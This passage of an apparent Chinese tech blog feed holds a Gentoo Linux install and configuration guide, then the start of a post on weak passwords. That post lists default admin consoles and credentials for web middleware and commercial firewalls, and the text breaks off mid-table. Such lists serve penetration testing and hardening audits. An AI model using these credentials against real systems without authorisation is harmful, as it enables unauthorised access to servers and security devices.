用户组</a></li></ul></li></ul><h1 id="1-准备工作"><a href="#1-准备工作" class="headerlink" title="1 准备工作"></a>1 准备工作</h1><h2 id="1-1-下载"><a href="#1-1-下载" class="headerlink" title="1.1 下载"></a>1.1 下载</h2><ul><li><p>下载<a href="https://mirrors.bfsu.edu.cn/gentoo/releases/amd64/autobuilds/current-install-amd64-minimal/">最小化安装镜像</a>, 名称为: <code>install-amd64-minimal-&#123;日期&#125;.iso</code>  </p></li><li><p>下载<a href="https://mirrors.bfsu.edu.cn/gentoo/releases/amd64/autobuilds/">合适的stage3</a>,以日期为路径: <code>20220703T170542Z/stage3-amd64-desktop-systemd-20220703T170542Z.tar.xz</code></p></li></ul><h2 id="1-2-网络"><a href="#1-2-网络" class="headerlink" title="1.2 网络"></a>1.2 网络</h2><p>基操忽略</p><h2 id="1-3-分区挂载"><a href="#1-3-分区挂载" class="headerlink" title="1.3 分区挂载"></a>1.3 分区挂载</h2><p>基操忽略</p><h2 id="1-4-ssh连接最小化安装系统"><a href="#1-4-ssh连接最小化安装系统" class="headerlink" title="1.4 ssh连接最小化安装系统"></a>1.4 ssh连接最小化安装系统</h2><p>编辑 <code>sshd</code> 服务配置文件 <code>/etc/ssh/sshd_config</code>, 重启服务 <code>rc-server sshd restart</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">PermitRootLogin <span class="hljs-built_in">yes</span><br>PasswordAuthentication <span class="hljs-built_in">yes</span><br></code></pre></td></tr></table></figure><h1 id="2-安装"><a href="#2-安装" class="headerlink" title="2 安装"></a>2 安装</h1><h2 id="2-1-解压基本系统"><a href="#2-1-解压基本系统" class="headerlink" title="2.1 解压基本系统"></a>2.1 解压基本系统</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs bash">livecd ~ <span class="hljs-comment"># blkid</span><br>/dev/sdb: UUID=<span class="hljs-string">&quot;e09609d8-0b90-4f34-aad1-8e5b37495f52&quot;</span> BLOCK_SIZE=<span class="hljs-string">&quot;4096&quot;</span> TYPE=<span class="hljs-string">&quot;ext4&quot;</span><br>/dev/sr0: BLOCK_SIZE=<span class="hljs-string">&quot;2048&quot;</span> UUID=<span class="hljs-string">&quot;2022-07-03-19-01-40-00&quot;</span> LABEL=<span class="hljs-string">&quot;Gentoo amd64 20220703T170542Z&quot;</span> TYPE=<span class="hljs-string">&quot;iso9660&quot;</span> PTUUID=<span class="hljs-string">&quot;5e426e6b&quot;</span> PTTYPE=<span class="hljs-string">&quot;dos&quot;</span><br>loop0: TYPE=<span class="hljs-string">&quot;squashfs&quot;</span><br>/dev/sda2: UUID=<span class="hljs-string">&quot;14077ead-3683-4354-95eb-a106c52350e9&quot;</span> BLOCK_SIZE=<span class="hljs-string">&quot;4096&quot;</span> TYPE=<span class="hljs-string">&quot;ext4&quot;</span> PARTUUID=<span class="hljs-string">&quot;4af31142-0ead-0644-b34c-c01b7c0944e1&quot;</span><br>/dev/sda1: UUID=<span class="hljs-string">&quot;831A-6EDD&quot;</span> BLOCK_SIZE=<span class="hljs-string">&quot;512&quot;</span> TYPE=<span class="hljs-string">&quot;vfat&quot;</span> PARTUUID=<span class="hljs-string">&quot;733a54ad-b3d7-3842-8cc8-21b15d29e82d&quot;</span><br>livecd ~ <span class="hljs-comment"># mount /dev/sda2 /mnt/gentoo/</span><br>livecd ~ <span class="hljs-comment"># mkdir /mnt/gentoo/boot</span><br>livecd ~ <span class="hljs-comment"># mount /dev/sda1 /mnt/gentoo/boot</span><br>livecd ~ <span class="hljs-comment"># cd /mnt/gentoo/</span><br>livecd /mnt/gentoo <span class="hljs-comment"># ls</span><br>boot  lost+found<br>livecd /mnt/gentoo <span class="hljs-comment"># wget https://mirrors.bfsu.edu.cn/gentoo/releases/amd64/autobuilds/20220703T170542Z/stage3-amd64-desktop-systemd-20220703T170542Z.tar.xz</span><br>--2022-07-05 08:09:54--  https://mirrors.bfsu.edu.cn/gentoo/releases/amd64/autobuilds/20220703T170542Z/stage3-amd64-desktop-systemd-20220703T170542Z.tar.xz  <br>Resolving mirrors.bfsu.edu.cn... 39.155.141.16, 2001:da8:20f:1003::fe55:2840<br>Connecting to mirrors.bfsu.edu.cn|39.155.141.16|:443... connected.<br>HTTP request sent, awaiting response... 200 OK<br>Length: 516402028 (492M) [application/octet-stream]<br>Saving to: ‘stage3-amd64-desktop-systemd-20220703T170542Z.tar.xz’<br>stage3-amd64-desktop-systemd- 100%[=================================================&gt;] 492.48M  11.3MB/s    <span class="hljs-keyword">in</span> 46s<br>2022-07-05 08:10:40 (10.6 MB/s) - ‘stage3-amd64-desktop-systemd-20220703T170542Z.tar.xz’ saved [516402028/516402028]<br>livecd /mnt/gentoo <span class="hljs-comment"># tar xpvf stage3-amd64-desktop-systemd-20220703T170542Z.tar.xz --xattrs-include=&#x27;*.*&#x27; --numeric-owner</span><br>……<br></code></pre></td></tr></table></figure><h2 id="2-2-镜像源与chroot"><a href="#2-2-镜像源与chroot" class="headerlink" title="2.2 镜像源与chroot"></a>2.2 镜像源与chroot</h2><p>配置一个速度较快的镜像源服务器地址</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">mirrorselect -i -o &gt;&gt;/mnt/gentoo/etc/portage/make.conf  <span class="hljs-comment"># 选择163和清华大学源</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;GENTOO_MIRRORS=&quot;https://mirrors.tuna.tsinghua.edu.cn/gentoo&quot;&#x27;</span> &gt;&gt;/mnt/gentoo/etc/portage/make.conf<br><span class="hljs-comment"># chroot 到目标系统</span><br><span class="hljs-comment"># 复制 DNS 配置到目标系统环境</span><br><span class="hljs-built_in">cp</span> -L /etc/resolv.conf /mnt/gentoo/etc/<br><span class="hljs-comment"># 挂载必要的文件系统</span><br>mount --types proc /proc /mnt/gentoo/proc<br>mount --rbind /sys /mnt/gentoo/sys<br>mount --rbind /dev /mnt/gentoo/dev<br><span class="hljs-comment"># systemd stage3 额外执行</span><br>mount --make-rslave /mnt/gentoo/sys<br>mount --make-rslave /mnt/gentoo/dev<br><span class="hljs-comment"># chroot 到目标系统环境</span><br><span class="hljs-built_in">chroot</span> /mnt/gentoo<br><span class="hljs-comment"># 导入环境信息</span><br>. /etc/profile<br><span class="hljs-comment"># 修改提示符以便于区分</span><br>PS1=(<span class="hljs-built_in">chroot</span>)<span class="hljs-variable">$PS1</span><br></code></pre></td></tr></table></figure><h2 id="2-3-portage仓库"><a href="#2-3-portage仓库" class="headerlink" title="2.3 portage仓库"></a>2.3 portage仓库</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 仓库信息打包下载到本地</span><br>emerge-webrsync<br><span class="hljs-comment"># 安装 vim</span><br>emerge --ask app-editors/vim<br></code></pre></td></tr></table></figure><h2 id="2-4-profile选择"><a href="#2-4-profile选择" class="headerlink" title="2.4 profile选择"></a>2.4 profile选择</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">(<span class="hljs-built_in">chroot</span>)livecd / <span class="hljs-comment"># eselect profile list</span><br>(<span class="hljs-built_in">chroot</span>)livecd / <span class="hljs-comment"># eselect profile set 7</span><br>(<span class="hljs-built_in">chroot</span>)livecd / <span class="hljs-comment"># emerge --ask --verbose --update --deep --newuse @world</span><br></code></pre></td></tr></table></figure><h2 id="2-5-安装内核、固件"><a href="#2-5-安装内核、固件" class="headerlink" title="2.5 安装内核、固件"></a>2.5 安装内核、固件</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">(<span class="hljs-built_in">chroot</span>)livecd / <span class="hljs-comment"># emerge --ask gentoo-kernel  </span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">(<span class="hljs-built_in">chroot</span>)livecd / <span class="hljs-comment"># emerge --ask linux-firmware</span><br><br></code></pre></td></tr></table></figure><h2 id="2-6-配置引导"><a href="#2-6-配置引导" class="headerlink" title="2.6 配置引导"></a>2.6 配置引导</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">(<span class="hljs-built_in">chroot</span>)livecd / <span class="hljs-comment"># emerge --ask grub</span><br>(<span class="hljs-built_in">chroot</span>)livecd / <span class="hljs-comment"># grub-install --target=x86_64-efi --efi-directory=/boot --bootloader-id=Gentoo</span><br>Installing <span class="hljs-keyword">for</span> x86_64-efi platform.<br>Installation finished. No error reported.<br>(<span class="hljs-built_in">chroot</span>)livecd / <span class="hljs-comment"># grub-install --target=x86_64-efi --efi-directory=/boot --removable</span><br>Installing <span class="hljs-keyword">for</span> x86_64-efi platform.<br>Installation finished. No error reported.  <br>(<span class="hljs-built_in">chroot</span>)livecd / <span class="hljs-comment"># grub-mkconfig -o /boot/grub/grub.cfg</span><br>Generating grub configuration file ...<br>Found linux image: /boot/vmlinuz-5.15.48-gentoo-dist<br>Found initrd image: /boot/initramfs-5.15.48-gentoo-dist.img<br>Warning: os-prober will not be executed to detect other bootable partitions.<br>Systems on them will not be added to the GRUB boot configuration.<br>Check GRUB_DISABLE_OS_PROBER documentation entry.<br>Adding boot menu entry <span class="hljs-keyword">for</span> UEFI Firmware Settings ...<br><span class="hljs-keyword">done</span>        <br></code></pre></td></tr></table></figure><h2 id="2-7-时区、字符集配置"><a href="#2-7-时区、字符集配置" class="headerlink" title="2.7 时区、字符集配置"></a>2.7 时区、字符集配置</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;Asia/Shanghai&#x27;</span> &gt; /etc/timezone<br><span class="hljs-built_in">rm</span> /etc/localtime<br>emerge --config sys-libs/timezone-data<br>vim /etc/locale.gen<br>locale-gen<br><br><span class="hljs-built_in">dd</span> <span class="hljs-keyword">if</span>=/dev/zero of=/swapfile bs=1M count=8192 status=progress<br><span class="hljs-built_in">chmod</span> 600 /swapfile<br>mkswap /swapfile<br>swapon /swapfile<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;/swapfile               none    swap    defaults        0 0&quot;</span> &gt;&gt; /etc/fstab<br></code></pre></td></tr></table></figure><h2 id="2-8-virtualbox-虚拟机配置"><a href="#2-8-virtualbox-虚拟机配置" class="headerlink" title="2.8 virtualbox 虚拟机配置"></a>2.8 virtualbox 虚拟机配置</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 新建用户</span><br>useradd -m -g wheel -G usb,<span class="hljs-built_in">users</span>,audio -s /bin/bash -N miloo<br><br><span class="hljs-comment"># 如果是虚拟机需要添加到以下两个组</span><br>gpasswd -a miloo vboxguest<br>gpasswd -a miloo vboxsf<br><br><span class="hljs-comment"># virtualbox 虚拟机安装后操作</span><br>emerge --ask app-emulation/virtualbox-guest-additions<br>systemctl <span class="hljs-built_in">enable</span> --now virtualbox-guest-additions<br></code></pre></td></tr></table></figure><h1 id="3-USE"><a href="#3-USE" class="headerlink" title="3 USE"></a>3 USE</h1><h2 id="3-1-make-conf"><a href="#3-1-make-conf" class="headerlink" title="3.1 make.conf"></a>3.1 make.conf</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># These settings were set by the catalyst build script that automatically</span><br><span class="hljs-comment"># built this stage.</span><br><span class="hljs-comment"># Please consult /usr/share/portage/config/make.conf.example for a more</span><br><span class="hljs-comment"># detailed example.</span><br>COMMON_FLAGS=<span class="hljs-string">&quot;-march=native -O2 -pipe&quot;</span><br>CFLAGS=<span class="hljs-string">&quot;<span class="hljs-variable">$&#123;COMMON_FLAGS&#125;</span>&quot;</span><br>CXXFLAGS=<span class="hljs-string">&quot;<span class="hljs-variable">$&#123;COMMON_FLAGS&#125;</span>&quot;</span><br>FCFLAGS=<span class="hljs-string">&quot;<span class="hljs-variable">$&#123;COMMON_FLAGS&#125;</span>&quot;</span><br>FFLAGS=<span class="hljs-string">&quot;<span class="hljs-variable">$&#123;COMMON_FLAGS&#125;</span>&quot;</span><br>MAKEOPTS=<span class="hljs-string">&quot;-j25&quot;</span><br><br><span class="hljs-comment"># <span class="hljs-doctag">NOTE:</span> This stage was built with the bindist Use flag enabled</span><br>PORTDIR=<span class="hljs-string">&quot;/var/db/repos/gentoo&quot;</span><br>DISTDIR=<span class="hljs-string">&quot;/var/cache/distfiles&quot;</span><br>PKGDIR=<span class="hljs-string">&quot;/var/cache/binpkgs&quot;</span><br><br><span class="hljs-comment"># This sets the language of build output to English.</span><br><span class="hljs-comment"># Please keep this setting intact when reporting bugs.</span><br>LC_MESSAGES=C<br><br><span class="hljs-comment"># mirrors</span><br>GENTOO_MIRRORS=<span class="hljs-string">&quot;https://mirrors.ustc.edu.cn/gentoo/&quot;</span><br>ACCEPT_LICENSE=<span class="hljs-string">&quot;*&quot;</span><br>ACCEPT_KEYWORDS=<span class="hljs-string">&quot;amd64&quot;</span><br>AUTO_CLEAN=<span class="hljs-string">&quot;yes&quot;</span><br><br><span class="hljs-comment"># aria</span><br>FETCHCOMMAND=<span class="hljs-string">&quot;/usr/bin/aria2c -d \$&#123;DISTDIR&#125; -o \$&#123;FILE&#125; --allow-overwrite=true --max-tries=5 --max-file-not-found=2 --max-concurrent-downloads=5 --connect-timeout=5 --timeout=5 --split=5 --min-split-size=2M --lowest-speed-limit=20K --max-connection-per-server=9 --uri-selector=feedback \$&#123;URI&#125;&quot;</span><br>RESUMECOMMAND=<span class="hljs-string">&quot;<span class="hljs-variable">$&#123;FETCHCOMMAND&#125;</span>&quot;</span><br><br><span class="hljs-comment"># ccache</span><br>FEATURES=<span class="hljs-string">&quot;ccache -test&quot;</span><br>CCACHE_DIR=<span class="hljs-string">&quot;/var/cache/ccache&quot;</span><br><br><span class="hljs-comment"># GRUB</span><br>GRUB_PLATFORMS=<span class="hljs-string">&quot;efi-64&quot;</span><br><br><span class="hljs-comment"># CPUS</span><br>ABI_X86=<span class="hljs-string">&quot;64&quot;</span><br>CPU_FLAGS_X86=<span class="hljs-string">&quot;aes avx avx2 f16c fma3 mmx mmxext pclmul popcnt rdrand sha sse sse2 sse3 sse4_1 sse4_2 sse4a ssse3&quot;</span><br><br><span class="hljs-comment"># cards</span><br>VIDEO_CARDS=<span class="hljs-string">&quot;amdgpu radeonsi vmware&quot;</span><br><br><span class="hljs-comment"># touchpad</span><br><span class="hljs-comment">#INPUT_DEVICES=&quot;libinput synaptics&quot;  ##设置后触摸板配置失效</span><br><br><span class="hljs-comment"># language</span><br>L10N=<span class="hljs-string">&quot;en-US zh-CN en zh&quot;</span><br>LINGUAS=<span class="hljs-string">&quot;en-US zh-CN en zh&quot;</span><br><br><span class="hljs-comment"># USE</span><br><br>SYSME=<span class="hljs-string">&quot;-test -doc systemd&quot;</span><br>GNOME=<span class="hljs-string">&quot;-kde -games -help -extras X gtk gnome&quot;</span><br>USE=<span class="hljs-string">&quot;<span class="hljs-variable">$&#123;SYSME&#125;</span> <span class="hljs-variable">$&#123;GNOME&#125;</span> &quot;</span><br></code></pre></td></tr></table></figure><h2 id="3-2-USE"><a href="#3-2-USE" class="headerlink" title="3.2 USE"></a>3.2 USE</h2><p>个人 <code>USE</code> 使用说明：</p><ul><li><code>/etc/portage/make.conf</code> 仅添加必要 <code>flag</code> 且尽量仅添加排除项。<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">SYSME=<span class="hljs-string">&quot;-test -doc systemd&quot;</span><br>GNOME=<span class="hljs-string">&quot;-kde -games -help -extras X gtk gnome&quot;</span><br>USE=<span class="hljs-string">&quot;<span class="hljs-variable">$&#123;SYSME&#125;</span> <span class="hljs-variable">$&#123;GNOME&#125;</span> &quot;</span><br></code></pre></td></tr></table></figure></li><li><code>/etc/portage/package.accept_keywords</code> 文件夹中创建文件，添加需要开启 <code>~amd</code>(测试) 属性的包<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">app-office/wps-office ~*<br></code></pre></td></tr></table></figure></li><li><code>/etc/portage/package.use</code> 文件夹中创建文件，添加与 <code>/etc/portage/make.conf</code> 中 <code>USE</code> 相悖或者仅对该包生效的 <code>flag</code><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">app-emulation/qemu spice QEMU_SOFTMMU_TARGETS: x86_64 QEMU_USER_TARGETS: x86_64<br>net-dns/dnsmasq script<br>net-misc/spice-gtk usbredir<br></code></pre></td></tr></table></figure></li></ul><h1 id="4-tools"><a href="#4-tools" class="headerlink" title="4 tools"></a>4 tools</h1><h2 id="4-1-包管理"><a href="#4-1-包管理" class="headerlink" title="4.1 包管理"></a>4.1 包管理</h2><h3 id="4-1-1-app-portage-x2F-eix"><a href="#4-1-1-app-portage-x2F-eix" class="headerlink" title="4.1.1 app-portage&#x2F;eix"></a>4.1.1 app-portage&#x2F;eix</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">app-portage/eix<br>app-portage/gentoolkit<br>app-portage/layman<br></code></pre></td></tr></table></figure><h2 id="4-2-文件系统"><a href="#4-2-文件系统" class="headerlink" title="4.2 文件系统"></a>4.2 文件系统</h2><h3 id="4-2-1-sys-fs-x2F-lvm2"><a href="#4-2-1-sys-fs-x2F-lvm2" class="headerlink" title="4.2.1 sys-fs&#x2F;lvm2"></a>4.2.1 sys-fs&#x2F;lvm2</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sys-fs/lvm2<br></code></pre></td></tr></table></figure><h3 id="4-2-2-ntfs"><a href="#4-2-2-ntfs" class="headerlink" title="4.2.2 ntfs"></a>4.2.2 ntfs</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sys-fs/ntfs3g<br></code></pre></td></tr></table></figure><h2 id="4-3-DE"><a href="#4-3-DE" class="headerlink" title="4.3 DE"></a>4.3 DE</h2><h3 id="4-3-1-gnome"><a href="#4-3-1-gnome" class="headerlink" title="4.3.1 gnome"></a>4.3.1 gnome</h3><blockquote><p>一定要有swap分区，否则编译不会通过<br>make.conf 中 MAKEOPTS&#x3D;”-j4” 此条不存在编译也会失败</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">gnome-base/gnome<br>gnome-base/gconf<br>gnome-extra/gnome-tweaks<br></code></pre></td></tr></table></figure><h2 id="4-4-vitual"><a href="#4-4-vitual" class="headerlink" title="4.4 vitual"></a>4.4 vitual</h2><h3 id="4-4-1-virtualbox"><a href="#4-4-1-virtualbox" class="headerlink" title="4.4.1 virtualbox"></a>4.4.1 virtualbox</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">app-emulation/virtualbox<br>app-emulation/virtualbox-additions<br>app-emulation/virtualbox-extpack-oracle<br>app-emulation/virtualbox-modules<br>app-emulation/virtualbox-guest-additions  <span class="hljs-comment"># gentoo虚拟机安装</span><br></code></pre></td></tr></table></figure><h3 id="4-4-2-kvm"><a href="#4-4-2-kvm" class="headerlink" title="4.4.2 kvm"></a>4.4.2 kvm</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">app-emulation/qemu<br>app-emulation/libvirt<br>app-emulation/virt-manager<br>net-misc/bridge-utils<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">usermod -a -G libvirt miloo<br>usermod -a -G kvm miloo <br>systemctl <span class="hljs-built_in">enable</span> libvirtd<br>systemctl <span class="hljs-built_in">enable</span> virtlogd-admin.socket<br></code></pre></td></tr></table></figure><h1 id="5-系统迁移"><a href="#5-系统迁移" class="headerlink" title="5 系统迁移"></a>5 系统迁移</h1><h2 id="5-1-权限备份与恢复"><a href="#5-1-权限备份与恢复" class="headerlink" title="5.1 权限备份与恢复"></a>5.1 权限备份与恢复</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">getfacl -R ./ &gt; acl.txt<br>setfacl --restore=acl.txt<br></code></pre></td></tr></table></figure><h2 id="5-2-用户组"><a href="#5-2-用户组" class="headerlink" title="5.2 用户组"></a>5.2 用户组</h2><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">用户id=<span class="hljs-number">1001</span><span class="hljs-comment">(miloo)</span> 组id=<span class="hljs-number">100</span><span class="hljs-comment">(users)</span> 组=<span class="hljs-number">100</span><span class="hljs-comment">(users)</span>,<span class="hljs-number">10</span><span class="hljs-comment">(wheel)</span>,<span class="hljs-number">11</span><span class="hljs-comment">(floppy)</span>,<span class="hljs-number">18</span><span class="hljs-comment">(audio)</span>,<span class="hljs-number">19</span><span class="hljs-comment">(cdrom)</span>,<span class="hljs-number">27</span><span class="hljs-comment">(video)</span>,<span class="hljs-number">85</span><span class="hljs-comment">(usb)</span>,<span class="hljs-number">78</span><span class="hljs-comment">(kvm)</span>,<span class="hljs-number">272</span><span class="hljs-comment">(plugdev)</span>,<span class="hljs-number">172</span><span class="hljs-comment">(pulse-access)</span>,<span class="hljs-number">304</span><span class="hljs-comment">(vboxusers)</span>,<span class="hljs-number">79</span><span class="hljs-comment">(libvirt)</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
      <category>Gentoo</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Linux</tag>
      
      <tag>Gentoo</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>经典漏洞-弱口令</title>
    <link href="/2022/06/17/2022-06-17.%E7%BB%8F%E5%85%B8%E6%BC%8F%E6%B4%9E-%E5%BC%B1%E5%8F%A3%E4%BB%A4/"/>
    <url>/2022/06/17/2022-06-17.%E7%BB%8F%E5%85%B8%E6%BC%8F%E6%B4%9E-%E5%BC%B1%E5%8F%A3%E4%BB%A4/</url>
    
    <content type="html"><![CDATA[<ul><li><a href="#1-%E9%BB%98%E8%AE%A4%E5%BC%B1%E5%8F%A3%E4%BB%A4">1 默认弱口令</a><ul><li><a href="#11-web%E5%AE%B9%E5%99%A8%E5%90%8E%E5%8F%B0%E5%BC%B1%E5%8F%A3%E4%BB%A4">1.1 web容器后台弱口令</a></li><li><a href="#12-%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87%E5%BC%B1%E5%8F%A3%E4%BB%A4">1.2 安全设备弱口令</a></li></ul></li><li><a href="#2-%E5%AE%9E%E6%88%98%E6%80%9D%E8%B7%AF">2 实战思路</a><ul><li><a href="#21-%E5%AD%97%E5%85%B8%E7%94%9F%E6%88%90">2.1 字典生成</a></li><li><a href="#22-%E6%89%B9%E9%87%8F%E7%88%86%E7%A0%B4%E5%B7%A5%E5%85%B7">2.2 批量爆破工具</a></li></ul></li></ul><h1 id="1-默认弱口令"><a href="#1-默认弱口令" class="headerlink" title="1 默认弱口令"></a>1 默认弱口令</h1><h2 id="1-1-web容器后台弱口令"><a href="#1-1-web容器后台弱口令" class="headerlink" title="1.1 web容器后台弱口令"></a>1.1 web容器后台弱口令</h2><table><thead><tr><th>常见中间件</th><th>管理端口</th><th>后台地址</th><th>默认账号名密码</th></tr></thead><tbody><tr><td>Jboss</td><td>8080</td><td><a href="http://ip:8080/web-console/">http://ip:8080/web-console/</a></br><a href="http://ip:8080/jmx-console/">http://ip:8080/jmx-console/</a></br><a href="http://ip:8080/console">http://ip:8080/console</a></td><td>admin&#x2F;admin</td></tr><tr><td>WebSphere</td><td>9060(控制台端口)</br>9043</br>9080</br>9443</br>2809</br>5060</br>5061</br>8880</br>9401</br>9403</br>9402</br>9100</br>9353</br>7276</br>7286</br>5558</br>5578</td><td><a href="http://ip:9060/ibm/console/">http://ip:9060/ibm/console/</a></td><td>默认没有鉴权页面</td></tr><tr><td>Weblogic</td><td>7001(http管理控制端口)</br>7002(https管理控制端口)</td><td><a href="http://ip:7001/console">http://ip:7001/console</a></td><td>weblogic&#x2F;weblogic1</br>weblogic&#x2F;weblogic</br>system&#x2F;system</br>portaladmin&#x2F;portaladmin</br>guest&#x2F;guest</td></tr><tr><td>Tomcat</td><td>8080</td><td><a href="http://ip:8080/manager/html">http://ip:8080/manager/html</a></td><td>tomcat&#x2F;tomcat</br>both&#x2F;tomcat</br>role1&#x2F;tomcat</br>manager&#x2F;admin</td></tr></tbody></table><h2 id="1-2-安全设备弱口令"><a href="#1-2-安全设备弱口令" class="headerlink" title="1.2 安全设备弱口令"></a>1.2 安全设备弱口令</h2><table><thead><tr><th>产品</th><th>登录地址</th><th>默认账号名密码</th><th>技术支持热线</th></tr></thead><tbody><tr><td>天融信防火墙</td><td><a href="https://192.168.1.254/">https://192.168.1.254</a></br><a href="https://192.168.1.254:8080/">https://192.168.1.254:8080</a></td><td>superman&#x2F;talent</br>superman&#x2F;talent!23</td><td>8008105119</td></tr><tr><td>联想网御防火墙(需要证书)</td><td><a href="https://10.1.5.254:8889/">https://10.1.5.254:8889</a></td><td>admin&#x2F;leadsec@7766</br>admin&#x2F;administrator</br>admin&#x2F;bane@7766</td><td>4008107766</br>1056632666</td></tr><tr><td>深信服防火墙</td><td><a href="https://10.251.251.251/">https://10.251.251.251</a></br><a href="https://10.254.254.254/">https://10.254.254.254</a></td><td>admin&#x2F;admin</td><td>4006306430</td></tr><tr><td>启明星辰</td><td><a 